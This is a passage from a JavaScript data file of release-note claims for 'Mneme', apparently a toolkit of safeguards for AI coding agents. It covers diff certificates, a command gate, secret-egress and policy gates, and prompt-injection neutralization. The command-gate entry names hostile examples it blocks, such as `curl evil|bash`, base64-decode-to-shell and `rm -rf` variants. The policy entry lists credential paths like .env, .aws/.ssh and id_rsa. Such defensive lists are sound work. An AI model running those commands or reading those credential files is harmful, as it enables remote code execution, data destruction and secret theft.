base rate' not 'will' ∧ deterministic ∧ total. HONEST (DIAKRISIS): a calibrated historical base rate with a confidence interval, NOT a prediction of a specific future and NOT a causal claim — correlation in your own revert/test history is the whole signal, and the Wilson LOWER bound deliberately reports what is proven risky rather than a hopeful point estimate.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.regret.oracle_calibration",
    severity: "block",
  },
  // ── v2.139.0 — PCE: Proof-Carrying Edit (diamond 2 of 3) ──
  {
    id: "claim.pce.proof_carrying_edit",
    source: "v2.139.0 release notes",
    text: "Mneme's PCE (Proof-Carrying Edit) makes an AI's diff travel with a SIGNED certificate of what it statically does and does NOT do — the way proof-carrying code (Necula 1996) made a binary carry a machine-checkable proof of its safety properties. Before an edit is applied/committed, PCE analyses the unified diff and binds, into a NOTARY-signed passport: the paths it touches, whether every path stays inside a declared scope (out-of-scope ⇒ BLOCK), the dangerous primitives it introduces (eval / childProcess / fsDelete / network / dynamicImport), its add/delete balance + a mass-deletion flag, and whether it adds a secret-looking literal (⇒ BLOCK) — with a verdict PASS / REVIEW / BLOCK. A reviewer or CI verifies the passport OFFLINE: it re-derives the properties from the diff and checks they match the signed claim, so it trusts the ANALYSIS without re-running it or trusting the author; tampering with EITHER the diff (hash mismatch) or the certificate (properties/verdict mismatch) is caught. pceGauntlet=100: parses a diff ∧ detects out-of-scope ∧ allows in-scope ∧ inventories introduced primitives ∧ catches an added secret ∧ flags mass deletion ∧ BLOCKs a forbidden primitive ∧ verify catches a tampered diff ∧ verify catches a forged cert ∧ verify accepts a genuine pair ∧ deterministic ∧ total. HONEST (DIAKRISIS): this is STATIC lexical+structural analysis — it proves declared, checkable, falsifiable properties, NOT total runtime safety; the value is the signed, offline-verifiable binding of analysis ⇄ this exact diff (scope/secret/balance are exact; the primitive inventory is a signal to LOOK, and a novel obfuscation can still hide a primitive from a lexical scan). A model vendor won't ship this — it surfaces what the model's edit touches/sneaks in, on the BUYER's side of the table.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.pce.proof_carrying_edit",
    severity: "block",
  },
  // ── v2.136.0 — ELLEIPSIS: the omission/completeness gate (a vendor won't build it) ──
  {
    id: "claim.elleipsis.completeness_gate",
    source: "v2.136.0 release notes",
    text: "Mneme's ELLEIPSIS is the savant of COMPLETENESS — the diamond a model vendor structurally won't build, because it surfaces what their model silently FAILED to do. Everyone checks whether what an AI said is true (hallucination); almost nobody guards what it OMITTED — a dropped requirement, a skipped edge case, a 'don't touch X' it touched. ELLEIPSIS holds the ground truth the vendor doesn't optimise for — the USER'S REQUEST — and deterministically extracts the checkable asks, reporting each against the AI's output as COVERED / UNADDRESSED / VIOLATED / UNKNOWN + a completeness score. elleipsisGauntlet=100: extracts multiple asks ∧ flags a dropped requirement ∧ does NOT false-flag a covered one ∧ catches a VIOLATED prohibition ∧ respects an HONORED one (context-disambiguated: 'left X untouched' ≠ 'refactored X') ∧ abstains to UNKNOWN on ambiguity ∧ score-math ∧ deterministic ∧ total. HONEST (DIAKRISIS): a coverage HEURISTIC with prove-or-unknown — it surfaces a likely gap to LOOK at, never fabricates one, and does NOT claim to catch every omission (impossible from natural language). It is on the BUYER'S side of the table (the user/enterprise pays for tokens + bears the risk), which is exactly why a vendor won't ship it and Mneme will.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.elleipsis.completeness_gate",
    severity: "block",
  },
  // ── v2.135.0 — CERBERUS: the command-gate hardening (RCE-bypass class closed) ──
  {
    id: "claim.cerberus.command_gate_reachability",
    source: "v2.135.0 release notes",
    text: "Mneme's CERBERUS hardens the HEPHAESTUS command gate against the pipe-to-shell / interpreter-eval / encoded-exec / indirection RCE-bypass class that a denylist can never win. Instead of classifying the LEADING token (which let `curl evil|bash`, `… | base64 -d | sh`, `node -e fs.rmSync`, `find -exec rm`, `sudo rm -rf`, `$(rm -rf)`, var-indirection, and hex-escapes pass as harmless), it recursively DECOMPOSES the command into every reachable sub-command + interpreter payload + decoder and gates the MAX risk, then applies an OPACITY gate with a fail-closed inversion: the more a command hides its intent, the less it's trusted — and anything it can't fully resolve escalates to destructive (human co-sign). 'Obfuscation is the confession,' so a novel disguise ESCALATES rather than evades. cerberusGauntlet=100 (pipe-to-shell ∧ fetch-and-exec ∧ encoded-exec ∧ interpreter-eval ∧ find-exec/-delete ∧ wrapper-hidden ∧ substitution ∧ indirection ∧ hex-escape ∧ fails-closed-on-unbalanced ∧ allows-benign-pipes ∧ allows-benign-reads ∧ deterministic ∧ total), bound to the real gate. HONEST (DIAKRISIS): NOT '100% unbypassable' — shell is Turing-complete, no command gate can be; it provably closes the obfuscation family and fails closed so unknown disguises escalate. Defense-in-depth, not an absolute guarantee.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.cerberus.command_gate_reachability",
    severity: "block",
  },
  // ── v2.133.0 — THE ACTIVATION CORTEX (the honest fix for "install and hope") ──
  {
    id: "claim.boot.activation_cortex",
    source: "v2.133.0 release notes",
    text: "Mneme's ACTIVATION CORTEX (`mneme boot` / `mneme.boot`) is the honest fix for the 'install and hope' problem — after an agent installs Mneme it often doesn't know WHEN to use the tools, so they sit idle. Boot returns a structured task→tool DECISION TABLE (each common session moment → the Mneme tool to reach for + why), the four boundary capabilities, and live cortex recall; the compact form is advertised via the STANDARDIZED MCP `instructions` field on connect (the sanctioned, Claude-Code-consumed surface, ≤2KB). bootGauntlet=100: the table is non-trivial + well-formed ∧ the instructions field fits the 2KB budget ∧ is NON-imperative (the documented-to-fail 'you MUST' pattern is absent) ∧ stable head+tail ∧ deterministic packet ∧ task-ranking never drops a row ∧ cortex facts capped ∧ valid SessionStart hook config ∧ total. HONEST (DIAKRISIS): a structured session-start decision table is genuinely not standardized in the MCP spec (novel as a primitive — competitive research found no equivalent), but reliable activation comes from the `instructions` field + an OPT-IN SessionStart hook (`mneme boot --emit-hook-config`); publishing the table does not by itself force invocation, and Mneme never self-registers a host hook.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.boot.activation_cortex",
    severity: "block",
  },
  // ── v2.131.0 — THE CONTEXT RAIL + DYNAMIC POLICY ENFORCEMENT (the "Visa rail" of AI context) ──
  {
    id: "claim.rail.governed_traversal",
    source: "v2.131.0 release notes",
    text: "Mneme is the CONTEXT RAIL — the single governed pipe every payload crosses between a local workspace and a hosted model, the honest 'Visa rail' of AI context. It unifies the seven Context-Gateway layers Mneme already ships into ONE auditable traversal: ingress (local→wire) = policy-gate → neutralize any injection a file planted + wrap as untrusted DATA → blind secret literals + sensitive identifier names (reverse map stays local); egress (wire→local) = secret-leak guard (honeytoken/bloom/pattern/entropy) → metered into the signed settlement ledger. Each crossing emits an Ed25519 receipt. railGauntlet=100: ingress BLOCKs at the policy gate (nothing crosses) ∧ neutralizes an injected dependency ∧ removes secret literals ∧ round-trips masked names ∧ ALLOWs benign code ∧ egress BLOCKs a tripped honeytoken ∧ REDACTs a pattern secret ∧ ALLOWs clean output + drafts a settlement tx with the correct sentHash ∧ reports byte savings honestly (delta = safe − raw exactly, never invented) ∧ hashes bind to the actual payloads ∧ deterministic ∧ total (hostile input fails closed). HONEST: a deterministic composition of proven layers with a signed receipt — NOT a 100% guarantee against novel prompt-injection (the firewall data/instruction boundary is the always-on catch-all, not a silver bullet), NOT homomorphic encryption, and NOT a claim that every model must speak one format (that is positioning, not a code guarantee). The token-SAVINGS headline belongs to outline/scaffold/channel (which meter into the treasury); the rail reports its own byte delta truthfully (can be ~0 or slightly negative because safety wrapping adds bytes)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.rail.governed_traversal",
    severity: "block",
  },
  {
    id: "claim.policy.deterministic_gate",
    source: "v2.131.0 release notes",
    text: "Mneme's DYNAMIC POLICY ENFORCEMENT (mneme.policy.json) is the deterministic, fail-closed access gate the Context Rail consults before any local context crosses to a model — Layer 2 of the rail. It denies known secret/PII surfaces by path-glob (.env family at any depth, **/secrets/**, .aws/.ssh, *.pem/*.key/id_rsa), by content pattern (AWS/GitHub/OpenAI/Slack keys, PEM private-key blocks, Thai national-id), by an optional agent allow-list, and by a byte cap. policyGauntlet=100: denies the .env family ∧ nested secret dirs ∧ pem/key ∧ secret CONTENT on an innocent path ∧ allows ordinary source ∧ enforces the agent allow-list ∧ enforces the byte cap ∧ glob soundness (** crosses dirs, * does not) ∧ fail-closed (an invalid deny-regex is skipped, an error DENYs) ∧ deterministic ∧ total. HONEST: this governs what the rail will RELAY to a model, NOT OS file permissions — a deterministic relay gate, not a sandbox",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.policy.deterministic_gate",
    severity: "block",
  },
  // ── v2.129.0 — SETTLEMENT LEDGER: the honest "Stripe of AI Context" audit/metering layer ──
  {
    id: "claim.settlement.signed_chain_audit",
    source: "v2.129.0 release notes",
    text: "Mneme's CONTEXT TRANSACTION SETTLEMENT LEDGER is the honest core of the image's 'Stripe of AI Context / Global Settlement Layer / Context Transaction Fee' — a hash-chained, offline-auditable record of every AI↔local context exchange (the blinded payload's hash + names/secrets hidden + the local-verify verdict + tokens metered), each signed (CLI/MCP add an Ed25519 NOTARY signature over the chain head). settlementGauntlet=100: chain-verifies-offline ∧ tamper-localized (editing one tx breaks the chain at that exact seq) ∧ reorder/insert/remove-detected ∧ statement-sums-correct ∧ USD+fee-only-from-the-user-supplied-rate (never invented) ∧ deterministic ∧ total. It is the achievable peak of the image's 'SVE' vision — an AUDIT + METERING substrate a CISO and a CFO can both verify offline — NOT homomorphic 'compute on ciphertext' encryption (which is too slow in 2026 and, taken literally as 'the AI obeys results it cannot read', is a contradiction). Composes EGRESS + BLIND + CHANNEL + OUTLINE + TREASURY",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.settlement.signed_chain_audit",
    severity: "block",
  },
  // ── v2.128.0 — CONTEXT-STATE CHANNEL: the honest L2 for an AI edit/debug loop ──
  {
    id: "claim.channel.state_channel_loop",
    source: "v2.128.0 release notes",
    text: "Mneme's CONTEXT-STATE CHANNEL is the honest 'L2 Lightning' for an AI edit/debug loop: the agent opens a channel over files (Mneme holds the working copy locally), sends tiny diff ops, gets COMPACT deltas back (ok + one-line brief + structural check — not the whole file re-streamed), and commits ONCE (the settlement). channelGauntlet=100: applies-region ∧ applies-text ∧ working-byte-exact ∧ catches-broken-structure ∧ rejects-bad-op (working unchanged) ∧ commit-byte-exact ∧ diff-compact ∧ savings-real (multi-op loop beats the naive re-stream) ∧ deterministic ∧ total. Composes with OUTLINE (orient) + BLIND (hide names) for an off-the-wire loop. HONEST: the saving is on the LOOP overhead (re-streaming files+outputs each turn) — real + compounding — not magic; the model still reasons each step; the core check is structural (a real compile/test is the CLI's spawn)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.channel.state_channel_loop",
    severity: "block",
  },
  // ── v2.127.0 — CONTEXT BLINDING: code's real names + secrets never reach the model ──
  {
    id: "claim.blind.reversible_structure_preserving",
    source: "v2.127.0 release notes",
    text: "Mneme's CONTEXT BLINDING is the honest, fast core of 'code never leaks to the model': before code is sent to a hosted model, secret literals are REMOVED and sensitive identifier names become reversible local placeholders (SecretFinancialEngine → MZ1) via a deterministic collision-free map kept ONLY on the user's machine; the model reasons over the preserved STRUCTURE, its reply is inverse-mapped back to the real names with 100% fidelity. blindGauntlet=100: round-trip-exact ∧ names-not-leaked ∧ bijection ∧ secrets-gone (removed, not in the map) ∧ structure-preserved ∧ edit-round-trips ∧ deterministic ∧ total. It is pseudonymization (ms-fast), NOT ZKP/FHE (too slow to run in real time in 2026) and NOT a kernel hook (malware); the code's structure stays visible (the model needs it) — names + secrets do not. Composes with the EGRESS guard",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.blind.reversible_structure_preserving",
    severity: "block",
  },
  // ── v2.126.0 — SCAFFOLD: honest Blueprint Inflation for known templates ──
  {
    id: "claim.scaffold.known_template_deterministic",
    source: "v2.126.0 release notes",
    text: "Mneme's SCAFFOLD is the HONEST core of 'Blueprint Inflation': an agent emits a compact spec for a KNOWN template (ts-model + CRUD, test-skeleton, config) and Mneme deterministically expands it into boilerplate locally — saving OUTPUT tokens (e.g. a 26-token spec → ~184 tokens of code, 7× expansion, 85.9% output saved). scaffoldGauntlet=100: ts-model-valid (interface + CRUD + every field, balanced) ∧ test-skeleton-valid ∧ config-round-trips ∧ expansion-real (>50% output saving) ∧ REFUSES-unknown-kind (ok:false honest, never guesses) ∧ deterministic ∧ total. HONEST scope: BOILERPLATE only — it does NOT generate arbitrary novel business logic (information theory forbids 2000 lines from a 35-token spec) and leaves TODO markers where the real logic goes",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.scaffold.known_template_deterministic",
    severity: "block",
  },
  // ── v2.124.0 — OUTLINE: read structure cheap, edit exact (token reduction) ──
  {
    id: "claim.outline.skeleton_region_exact",
    source: "v2.124.0 release notes",
    text: "Mneme's OUTLINE lets any AI agent (vendor-neutral, via CLI or MCP) read a code file's structural SKELETON — every symbol + EXACT line range, bodies elided — for a fraction of the tokens instead of loading the whole file, then fetch the byte-EXACT slice(s) only where it edits; MULTI-LANGUAGE (TS/JS + Python indent-scoped + Go + Rust + Java/C, auto-detected) + multi-region (comma-separated selectors); outlineGauntlet=100: reduction-real ∧ navigable ∧ region-byte-exact ∧ region-by-line-exact ∧ multi-region-exact ∧ python-indent ∧ go-brace ∧ rust-brace ∧ mask-length-preserved ∧ deterministic ∧ total. The skeleton is honestly LOSSY (orientation), the region fetch byte-exact (editing) in EVERY language; token figures a labelled ≈chars/4 estimate of INPUT context. The honest fix for context-loading hyper-inflation — NOT a kernel hook, NOT 'understand code without seeing it', NOT lossless Code-DNA-folding fantasy (information theory forbids it)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.outline.skeleton_region_exact",
    severity: "block",
  },
  // ── v2.122.0 — BEQUEST: Second Brain Inheritance (knowledge survival) ──
  {
    id: "claim.bequest.inheritance_math_sound",
    source: "v2.122.0 release notes",
    text: "Mneme's BEQUEST (Second Brain Inheritance) turns key-person-risk DETECTION into knowledge SURVIVAL: survival S(u)=1−∏(1−fluency) (reliability redundancy over git-derived holders), inheritance completeness + ORPHANED mass = mass-weighted survival, signed succession capsules with a transfer-integrity proof, and a greedy minimum-heir set-cover that beats the (1−1/e) bound; bequestGauntlet=100 over a 4,000-case sweep: survival-identity ∧ survival-monotone ∧ completeness-identity (orphaned=total−surviving exact) ∧ capsule-tamper-evident ∧ inheritance-verifies ∧ set-cover≥(1−1/e)·OPT ∧ deterministic ∧ total. A fresh COMPOSITION of standard, checkable building blocks — NOT a fabricated metric or an unfalsifiable 'novel theorem'; $ only from user-supplied rates",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.bequest.inheritance_math_sound",
    severity: "block",
  },
  // ── v2.120.0 — EXEC value layer: real signals framed for a CXO, honest ROI math ──
  {
    id: "claim.exec.roi_math_sound",
    source: "v2.120.0 release notes",
    text: "Mneme's EXEC layer frames REAL signals for an executive (key-person/bus-factor risk from atrophy, talent map from stigmergy, governance/promise-debt from promise, realized value from the treasury ledger, MCP attack surface from skeleton_key) and adds one new piece of honest math — the ROI projection = (MEASURED tokens-saved per reduction) × (user team × usage × months) × (user vendor price); execGauntlet=100 over a 5,000-case sweep: zero-team⇒zero ∧ zero-rate⇒zero ∧ monotonic-in-team ∧ monotonic-in-price ∧ USD-identity-exact ∧ realized-USD-exact ∧ deterministic ∧ total. $ figures only from user-supplied rates, always labelled — NOT a business forecast / fabricated metric",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.exec.roi_math_sound",
    severity: "block",
  },
  // ── v2.118.0 — SOVEREIGN EGRESS GUARD: code/secrets never leak, with proof ──
  {
    id: "claim.egress.sovereign_guard",
    source: "v2.118.0 release notes",
    text: "Mneme's SOVEREIGN EGRESS GUARD is a deterministic outbound boundary that pattern-redacts known secret classes, trips on HONEYTOKEN canaries (exfiltration → BLOCK), catches registered secrets via a one-way Bloom filter that NEVER stores the secret, AND (v2.119) catches an UNREGISTERED high-entropy key via a Shannon-entropy structural layer while scanning arbitrarily large payloads in bounded memory (streaming); gauntlet=100 incl. a 10,000-secret no-false-negative sweep: canary→BLOCK ∧ pattern→REDACT (raw key removed) ∧ clean→ALLOW ∧ Bloom-never-false-negatives ∧ Bloom-false-positive<5% ∧ cert-binds-payload-HASH-only ∧ entropy-catches-unregistered ∧ entropy-spares-prose ∧ shannonEntropy-math-sound ∧ streaming-equals-whole ∧ deterministic ∧ total. The honest enterprise 'code never leaks, with proof' gate — NOT DLP-vaporware / kernel-VRAM-injection / 'unhackable' fantasy",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.egress.sovereign_guard",
    severity: "block",
  },
];
